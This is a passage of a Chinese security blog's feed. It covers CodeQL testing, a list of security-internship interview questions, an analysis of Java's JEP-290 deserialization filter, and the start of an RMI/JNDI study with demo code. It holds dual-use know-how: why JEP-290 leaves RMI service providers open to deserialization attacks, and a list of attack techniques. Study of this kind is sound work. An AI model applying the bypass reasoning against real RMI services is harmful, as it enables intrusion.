sink, TaintKind kind) &#123;</span><br><span class="line">        &quot;1&quot; &#x3D; &quot;1&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也可以观察到 <code>tmp = tmp.split(&#39;|&#39;)</code> 的返回值是没被 select 到的. 也可以验证这一点.  </p><p>这样测试下来, 感觉最大的问题还是编写起来测试太费劲了, 就算只更改一点内容, 编译和运行都要 1~2 分钟才能完成. 对 database 也是同理, 只能重新生成, 没有更新的选项, 浪费了大量的时间.<br>剩下的可能是自带的 taint tracking 不够给力, 还好官方给了相关的接口 (DataFlowExtension), 需要自己研究下添加额外 taint 的方法, 至少 split 肯定是得加进去的吧.</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;安装&quot;&gt;&lt;a href=&quot;#安装&quot; class=&quot;headerlink&quot; title=&quot;安装&quot;&gt;&lt;/a&gt;安装&lt;/h2&gt;&lt;p&gt;入口: &lt;a href=&quot;https://help.semmle.com/codeql/codeql-cli/procedures/get-started.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://help.semmle.com/codeql/codeql-cli/procedures/get-started.html&lt;/a&gt;&lt;br&gt;下载地址: &lt;a href=&quot;https://github.com/github/codeql-cli-binaries/releases&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/github/codeql-cli-binaries/releases&lt;/a&gt;&lt;br&gt;license: &lt;a href=&quot;https://securitylab.github.com/tools/codeql/license&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://securitylab.github.com/tools/codeql/license&lt;/a&gt;  &lt;/p&gt;
    
    </summary>
    
    
    
      <category term="codeql" scheme="https://rmb122.com/tags/codeql/"/>
    
  </entry>
  
  <entry>
    <title>2020 年春季安全岗实习面试经历</title>
    <link href="https://rmb122.com/2020/03/23/2020-%E5%B9%B4%E5%AE%89%E5%85%A8%E5%B2%97%E5%AE%9E%E4%B9%A0%E9%9D%A2%E8%AF%95%E7%BB%8F%E5%8E%86/"/>
    <id>https://rmb122.com/2020/03/23/2020-%E5%B9%B4%E5%AE%89%E5%85%A8%E5%B2%97%E5%AE%9E%E4%B9%A0%E9%9D%A2%E8%AF%95%E7%BB%8F%E5%8E%86/</id>
    <published>2020-03-23T09:44:22.000Z</published>
    <updated>2020-04-24T06:02:51.296Z</updated>
    
    <content type="html"><![CDATA[<p>不定时更新</p><a id="more"></a><h2 id="字节跳动-企业应用安全-Offer"><a href="#字节跳动-企业应用安全-Offer" class="headerlink" title="字节跳动-企业应用安全 (Offer)"></a>字节跳动-企业应用安全 (Offer)</h2><h3 id="一面"><a href="#一面" class="headerlink" title="一面"></a>一面</h3><ol><li>自我介绍</li><li>实习经历</li><li>实习时候用的 SAST 工具是什么, 怎么实现的 </li><li>python list 去重</li><li>python 怎么去掉数组最后一个 element</li><li>python 什么函数可以将 dict 内不存在 key, value 就设置并返回其值 (setdefault)</li><li>python 哪些数据类型</li><li>进程间通讯方法</li><li>写过 log 库没</li><li>印象最深的渗透/挖洞经历</li><li>有没有挖过 src</li><li>数据库学的什么水平</li><li>一般给哪些属性建索引</li><li>redis 用过么, 怎么用的</li><li>python 常用哪些库</li><li>flask 介绍一下</li><li>flask 身份验证功能怎么实现</li><li>python, c 垃圾回收怎么实现的</li><li>你写的项目介绍一下</li><li>CBC 加密原理</li><li>加密中损坏一位, 对接下来的影响</li><li>有什么加密方式能解决这个问题</li><li>leetcode 179 // 没让手撕, 但是我没有刷过算法题 orz, 所以还是没答出来, 最多做做 easy 难度 (逃</li><li>你有什么问题问我</li></ol><h3 id="二面"><a href="#二面" class="headerlink" title="二面"></a>二面</h3><ol><li>自我介绍</li><li>web 安全和企业安全的联系, 区别等</li><li>csrf 原理</li><li>csrf 防御</li><li>xss 原理</li><li>xss 防御</li><li>vue 怎么防御的</li><li>mxss</li><li>ssrf 绕过</li><li>chrome xss auidtor 知道么, 怎么绕过</li><li>项目介绍一下</li><li>印象最深的渗透/挖洞经历</li><li>有审计过框架么, 哪些, 介绍一下</li><li>fastjson 最新的利用链了解么</li><li>你有什么问题问我</li></ol><h3 id="三面"><a href="#三面" class="headerlink" title="三面"></a>三面</h3><ol><li>自我介绍</li><li>实习经历</li><li>ctf 经历介绍一下, 打的比赛经历说一下</li><li>csrf 原理</li><li>cookie samesite 介绍一下</li><li>算法题, 终于是 easy 难度了, 字符串去重 (“ttgggggttaa123dd” -&gt; “tgta123d”)</li><li>写的算法复杂度多少</li><li>怎么写测试用例</li><li>tcp 三次握手</li><li>用过哪些工具</li><li>BurpSuite 代理原理</li><li>BurpSuite Intruder 是干嘛的 介绍一下</li><li>https 原理</li><li>https 在 wireshark 下怎么解密</li><li>tcp window size</li><li>tcp 滑动窗口</li><li>有没有渗透经历</li><li>啥时候能入职</li><li>过来想干嘛</li><li>有什么问题问我</li></ol><h2 id="腾讯-TSRC-口头-Offer-拒"><a href="#腾讯-TSRC-口头-Offer-拒" class="headerlink" title="腾讯-TSRC (口头 Offer 拒)"></a>腾讯-TSRC (口头 Offer 拒)</h2><h3 id="一面-1"><a href="#一面-1" class="headerlink" title="一面"></a>一面</h3><ol><li>自我介绍</li><li>sql 盲注</li><li>sql 盲注, 怎么解决速度问题</li><li>ssrf 怎么绕过, 检测 (DNS log)</li><li>mysql 读本地文件需要哪些权限</li><li>mysql 读本地文件权限具体名字</li><li>fastjson, java 反序列化检测 (DNS log + 1)</li><li>rmi 利用</li><li>oauth2 可能出现的漏洞</li><li>xss 跨域</li><li>postMessage 跨域利用方式</li><li>ssrf 打内网思路, 各种服务, redis, docker(k8s 那块, 没用过) 等</li><li>服务器被入侵, 检测挖矿病毒并溯源</li><li>查看文件修改时间</li><li>查看进程打开的文件, 端口</li><li>一个购物网站, 从购买到支付可能存在的漏洞</li><li>sql 注入 OOB</li><li>实现一个自动扫描器的思路</li><li>挖框架漏洞的思路</li><li>写过扫描器么</li><li>端口扫描器的原理</li><li>端口扫描器系统指纹识别的原理</li><li>你有什么问题问我</li></ol><h3 id="二面-1"><a href="#二面-1" class="headerlink" title="二面"></a>二面</h3><ol><li>自我介绍</li><li>java 反序列化</li><li>java commons-collections 怎么利用的</li><li>java rmi 怎么利用</li><li>java rmi 打注册局</li><li>java JNDI 注入</li><li>怎么学习安全相关知识的</li><li>windows 提权</li><li>linux 提权</li><li>绕 IDS, WAF</li><li>域渗透</li><li>日过哪些站</li><li>太多了记不住了, 问了一小时嘴巴都干了 orz</li></ol><h3 id="三面-1"><a href="#三面-1" class="headerlink" title="三面"></a>三面</h3><ol><li>自我介绍</li><li>问一些项目</li><li>实习经历</li><li>挖洞思路</li><li>实习时候挖了哪些洞</li><li>ssrf 原理, 绕过</li><li>fastjson 原理, 怎么绕过的</li><li>渗透经历</li><li>有没有搞过免杀</li><li>搞过 apk 逆向等</li><li>聊家常 orz</li><li>说一些工作内容, 比如应急响应 (7x24) 能不能接受</li></ol><h2 id="腾讯-云鼎实验室-Offer-拒"><a href="#腾讯-云鼎实验室-Offer-拒" class="headerlink" title="腾讯-云鼎实验室 (Offer 拒)"></a>腾讯-云鼎实验室 (Offer 拒)</h2><h3 id="一面-2"><a href="#一面-2" class="headerlink" title="一面"></a>一面</h3><ol><li>实习经历</li><li>file_exist 有什么思路</li><li>codeql 了解么 (刚好之前看了 rr 发的 post, tql)</li><li>php 混淆有哪些思路</li><li>webpack source map 源码泄漏, 攻击思路</li><li>文件上传思路</li><li>比赛哪道题映像深刻</li></ol><p>PS. 一开始就说大概聊 15 分钟, 真就 15 分钟, 也不用自我介绍, 效率是真的高 orz, 可以看到问的是一些相对前沿的问题吧, 毕竟实验室 tql<br>比较奇怪的是我在被腾讯的两个部门同时面试 orz, 不知道啥情况  </p><h3 id="二面-2"><a href="#二面-2" class="headerlink" title="二面"></a>二面</h3><p>主要问相关经验和一些基础知识  </p><h3 id="三面-HR-面"><a href="#三面-HR-面" class="headerlink" title="三面 + HR 面"></a>三面 + HR 面</h3><p>聊聊天, 没啥问题  </p><h2 id="阿里-Offer-拒"><a href="#阿里-Offer-拒" class="headerlink" title="阿里 (Offer 拒)"></a>阿里 (Offer 拒)</h2><h3 id="一面-3"><a href="#一面-3" class="headerlink" title="一面"></a>一面</h3><ol><li>自我介绍</li><li>CTF 比赛有哪一题映像深, 介绍一下</li><li>项目, 你的 ezrasp 怎么实现的</li><li>怎么防止命令注入</li><li>common-collections 反序列化漏洞原理</li><li>除了 ProcessImpl, 其他的命令执行方法 (loadLibrary)</li><li>无文件落地? (Windows uncpath 加载远程的)</li><li>有什么绕过 rasp 的思路</li><li>为什么要写这个</li><li>burp 破解原理</li><li>大量日志怎么管理</li><li>xss 平台介绍</li><li>学过其他一开始不擅长的东西么 (我说学过一点 pwn, 不过之后确实问的也不是很难的 pwn 技巧)</li><li>ROP 怎么利用</li><li>怎么防止栈溢出</li><li>ASLR 开启怎么 pwn</li><li>你有什么要问的</li></ol><h3 id="二面-3"><a href="#二面-3" class="headerlink" title="二面"></a>二面</h3><p>主要问开发项目相关问题  </p><h3 id="三面-2"><a href="#三面-2" class="headerlink" title="三面"></a>三面</h3><p>交叉面, 问一些基础问题, 比如 tcp 握手, http 协议, 跨域啥的  </p><hr><p>字节相对来说偏基础一些, 问一些考察基础的问题. 而且一面面试官听内推同学说是搞安全开发的 orz, 所以问了很多开发的内容.<br>腾讯相对偏实践一些, 问一些需要经验的内容, 当也都有专业相关内容的考察, 比如说 csrf, fastjson rce 原理等.<br>阿里其实已经到二面了, 但是懒得写了 orz, 特点是会问对着项目相关经历问一些比较深的内容. 比如我写了 rasp, 就会问 rasp 的实现原理和优缺点等等.<br>可能在之后有机会不定时更新.  </p><p>当然这些都无法代表所有的面试官, 最多只能代表相关组面试喜欢问的内容, 仅供参考.  </p><p>Update at 2020-04-24:<br>没想到竟然能凑齐字节, 阿里, 腾讯的 Offer, 最后选择了字节, 原因有很多, 最主要原因还是转正把, 拒掉云鼎的原因也有很多, 比较复杂, 不太好说. 希望在一年后回来看现在的自己, 做出的是正确的选择吧.  </p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;不定时更新&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="interview" scheme="https://rmb122.com/tags/interview/"/>
    
  </entry>
  
  <entry>
    <title>JEP-290 相关学习</title>
    <link href="https://rmb122.com/2020/03/22/JEP-290-%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/"/>
    <id>https://rmb122.com/2020/03/22/JEP-290-%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/</id>
    <published>2020-03-22T08:09:59.000Z</published>
    <updated>2020-05-29T04:34:37.672Z</updated>
    
    <content type="html"><![CDATA[<p>官网介绍: <a href="https://openjdk.java.net/jeps/290" target="_blank" rel="noopener">https://openjdk.java.net/jeps/290</a>  </p><p>JEP = JDK Enhancement Proposals<br>就是等于改进提案.  python 也有类似的, 就是大家喜闻乐见的 PEP (Python Enhancement Proposals).  </p><a id="more"></a><p>在这个 290 里面, 干的事情就是新增一个自带的反序列化过滤器.  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Security guidelines consistently require that input from external sources be validated before use. The filter mechanism will allow object-serialization clients to more easily validate their inputs, and exported RMI objects to validate invocation arguments.</span><br></pre></td></tr></table></figure><p>jdk 源码里面可以看到  </p><p>src/java.rmi/share/classes/sun/rmi/registry/RegistryImpl.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> ObjectInputFilter registryFilter =</span><br><span class="line">            AccessController.doPrivileged((PrivilegedAction&lt;ObjectInputFilter&gt;)RegistryImpl::initRegistryFilter);</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    * Initialize the registryFilter from the security properties or system property; if any</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@return</span> an ObjectInputFilter, or null</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"><span class="meta">@SuppressWarnings</span>(<span class="string">"deprecation"</span>)</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> ObjectInputFilter <span class="title">initRegistryFilter</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    ObjectInputFilter filter = <span class="keyword">null</span>;</span><br><span class="line">    String props = System.getProperty(REGISTRY_FILTER_PROPNAME);</span><br><span class="line">    <span class="keyword">if</span> (props == <span class="keyword">null</span>) &#123;</span><br><span class="line">        props = Security.getProperty(REGISTRY_FILTER_PROPNAME);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (props != <span class="keyword">null</span>) &#123;</span><br><span class="line">        filter = SharedSecrets.getJavaObjectInputFilterAccess().createFilter2(props);</span><br><span class="line">        Log regLog = Log.getLog(<span class="string">"sun.rmi.registry"</span>, <span class="string">"registry"</span>, -<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (regLog.isLoggable(Log.BRIEF)) &#123;</span><br><span class="line">            regLog.log(Log.BRIEF, <span class="string">"registryFilter = "</span> + filter);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> filter;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> ObjectInputFilter.<span class="function">Status <span class="title">registryFilter</span><span class="params">(ObjectInputFilter.FilterInfo filterInfo)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (registryFilter != <span class="keyword">null</span>) &#123;</span><br><span class="line">        ObjectInputFilter.Status status = registryFilter.checkInput(filterInfo);</span><br><span class="line">        <span class="keyword">if</span> (status != ObjectInputFilter.Status.UNDECIDED) &#123;</span><br><span class="line">            <span class="comment">// The Registry filter can override the built-in white-list</span></span><br><span class="line">            <span class="keyword">return</span> status;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (filterInfo.depth() &gt; REGISTRY_MAX_DEPTH) &#123;</span><br><span class="line">        <span class="keyword">return</span> ObjectInputFilter.Status.REJECTED;</span><br><span class="line">    &#125;</span><br><span class="line">    Class&lt;?&gt; clazz = filterInfo.serialClass();</span><br><span class="line">    <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (clazz.isArray()) &#123;</span><br><span class="line">            <span class="comment">// Arrays are REJECTED only if they exceed the limit</span></span><br><span class="line">            <span class="keyword">return</span> (filterInfo.arrayLength() &gt;= <span class="number">0</span> &amp;&amp; filterInfo.arrayLength() &gt; REGISTRY_MAX_ARRAY_SIZE)</span><br><span class="line">                ? ObjectInputFilter.Status.REJECTED</span><br><span class="line">                : ObjectInputFilter.Status.UNDECIDED;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (String.class == clazz</span><br><span class="line">                || java.lang.Number.class.isAssignableFrom(clazz)</span><br><span class="line">                || Remote.class.isAssignableFrom(clazz)</span><br><span class="line">                || java.lang.reflect.Proxy.class.isAssignableFrom(clazz)</span><br><span class="line">                || UnicastRef.class.isAssignableFrom(clazz)</span><br><span class="line">                || RMIClientSocketFactory.class.isAssignableFrom(clazz)</span><br><span class="line">                || RMIServerSocketFactory.class.isAssignableFrom(clazz)</span><br><span class="line">                || java.rmi.activation.ActivationID.class.isAssignableFrom(clazz)</span><br><span class="line">                || java.rmi.server.UID.class.isAssignableFrom(clazz)) &#123;</span><br><span class="line">            <span class="keyword">return</span> ObjectInputFilter.Status.ALLOWED;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> ObjectInputFilter.Status.REJECTED;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ObjectInputFilter.Status.UNDECIDED;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">RegistryImpl</span><span class="params">(<span class="keyword">int</span> port)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> RemoteException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (port == Registry.REGISTRY_PORT &amp;&amp; System.getSecurityManager() != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="comment">// grant permission for default port only.</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            AccessController.doPrivileged(<span class="keyword">new</span> PrivilegedExceptionAction&lt;Void&gt;() &#123;</span><br><span class="line">                <span class="function"><span class="keyword">public</span> Void <span class="title">run</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">                    LiveRef lref = <span class="keyword">new</span> LiveRef(id, port);</span><br><span class="line">                    setup(<span class="keyword">new</span> UnicastServerRef(lref, RegistryImpl::registryFilter));</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;, <span class="keyword">null</span>, <span class="keyword">new</span> SocketPermission(<span class="string">"localhost:"</span>+port, <span class="string">"listen,accept"</span>));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (PrivilegedActionException pae) &#123;</span><br><span class="line">            <span class="keyword">throw</span> (RemoteException)pae.getException();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        LiveRef lref = <span class="keyword">new</span> LiveRef(id, port);</span><br><span class="line">        setup(<span class="keyword">new</span> UnicastServerRef(lref, RegistryImpl::registryFilter)); <span class="comment">// 这一行, 将过滤器传给了 UnicastServerRef</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意有两个 registryFilter, 一个是静态函数, 一个是静态对象.<br>静态对象在类定义时被赋值, registryFilter 静态函数在函数体里面调用了 registryFilter 对象来检查.  </p><p>其中 registryFilter 对象来源应该就是从 JEP 290 加的属性 jdk.serialFilter 里面读取过滤规则. 因为 ObjectInputStream 里面只能设置一个 ObjectInputFilter. 如果要自定义, 就只能先读取原来的, 然后在自己新定义的 filter 中调用原来的. 否则原来的规则就没了, 所以底下的就是 RMI 真正新增的过滤.  </p><p>可以看到过滤规则主要就是: </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (String.class == clazz</span><br><span class="line">        || java.lang.Number.class.isAssignableFrom(clazz)</span><br><span class="line">        || Remote.class.isAssignableFrom(clazz)</span><br><span class="line">        || java.lang.reflect.Proxy.class.isAssignableFrom(clazz)</span><br><span class="line">        || UnicastRef.class.isAssignableFrom(clazz)</span><br><span class="line">        || RMIClientSocketFactory.class.isAssignableFrom(clazz)</span><br><span class="line">        || RMIServerSocketFactory.class.isAssignableFrom(clazz)</span><br><span class="line">        || java.rmi.activation.ActivationID.class.isAssignableFrom(clazz)</span><br><span class="line">        || java.rmi.server.UID.class.isAssignableFrom(clazz)) &#123;</span><br><span class="line">    <span class="keyword">return</span> ObjectInputFilter.Status.ALLOWED;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> ObjectInputFilter.Status.REJECTED;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>检查了反序列化对象是否是 <code>String</code> 或者是 <code>Number</code>, <code>Remote</code>, <code>Proxy</code>, <code>UnicastRef</code>, <code>RMIClientSocketFactory</code>, <code>RMIServerSocketFactory</code>, <code>ActivationID</code>, <code>UID</code> 的子类, 否则就拒绝反序列化, 可以看到是白名单, 还是挺靠谱的. 也确实效果挺好, 能 bypass 的也只有 JRMPClient.  </p><p>不过这只对 bind 等操作生效. 因为在真正调用远程对象时, 处理函数调用的是 Service Provider 而不是 Registry. Registry 是 RegistryImpl, 而 Service Provider 得到的是 RegistryImpl_Stub. 其在默认情况下是没有 filter 的,  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">RegistryImpl_Stub</span><span class="params">(java.rmi.server.RemoteRef ref)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>(ref);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这也是 JEP-290 能被绕过的原因. 其只对 Registry 做了防护, 而 Service Provider 也会进行反序列化, 却没有做反序列化的防护.<br>当然, Service Provider 确实无法进行白名单层面的防护, 因为函数的参数类型是各种各样的, 估计也是出于对兼容性和黑名单被绕过的考虑, 也没进行黑名单防护.</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>[1] <a href="https://mogwailabs.de/blog/2019/03/attacking-java-rmi-services-after-jep-290/" target="_blank" rel="noopener">https://mogwailabs.de/blog/2019/03/attacking-java-rmi-services-after-jep-290/</a><br>[2] <a href="http://www.codersec.net/2018/09/%E4%B8%80%E6%AC%A1%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91rmi%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%B7%B1%E6%80%9D/" target="_blank" rel="noopener">http://www.codersec.net/2018/09/%E4%B8%80%E6%AC%A1%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91rmi%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%B7%B1%E6%80%9D/</a>  </p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;官网介绍: &lt;a href=&quot;https://openjdk.java.net/jeps/290&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://openjdk.java.net/jeps/290&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;JEP = JDK Enhancement Proposals&lt;br&gt;就是等于改进提案.  python 也有类似的, 就是大家喜闻乐见的 PEP (Python Enhancement Proposals).  &lt;/p&gt;
    
    </summary>
    
    
    
      <category term="java" scheme="https://rmb122.com/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>JAVA JNDI / RMI 学习</title>
    <link href="https://rmb122.com/2020/02/04/JAVA-JNDI-RMI-%E5%AD%A6%E4%B9%A0/"/>
    <id>https://rmb122.com/2020/02/04/JAVA-JNDI-RMI-%E5%AD%A6%E4%B9%A0/</id>
    <published>2020-02-04T14:39:58.000Z</published>
    <updated>2020-05-29T04:35:04.112Z</updated>
    
    <content type="html"><![CDATA[<p>RMI / JNDI 在反序列化, fastjson 漏洞利用的时候都经常出现, 学习一下.</p><a id="more"></a><h1 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h1><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>盗一张图  </p><p><img src="https://i.loli.net/2020/02/19/pMiX4BNVRzeadD6.png" alt="1.png"></p><p>加上一些示例,  </p><p>RMIServer.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo.rmb122;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Registry reg = LocateRegistry.createRegistry(<span class="number">9999</span>);</span><br><span class="line">        System.out.println(<span class="string">"java RMI registry created. port on 9999..."</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">            Thread.sleep(<span class="number">10000</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>RMIServiceProvider.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo.rmb122;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIServiceProvider</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Registry registry = LocateRegistry.getRegistry(<span class="string">"127.0.0.1"</span>, <span class="number">9999</span>);</span><br><span class="line"></span><br><span class="line">        TestObjectImpl obj = <span class="keyword">new</span> TestObjectImpl();</span><br><span class="line">        TestObject services = (TestObject) UnicastRemoteObject.exportObject(obj, <span class="number">0</span>);</span><br><span class="line">        registry.bind(<span class="string">"test"</span>, services);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>RMIClient.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo.rmb122;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteObjectInvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteRef;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span 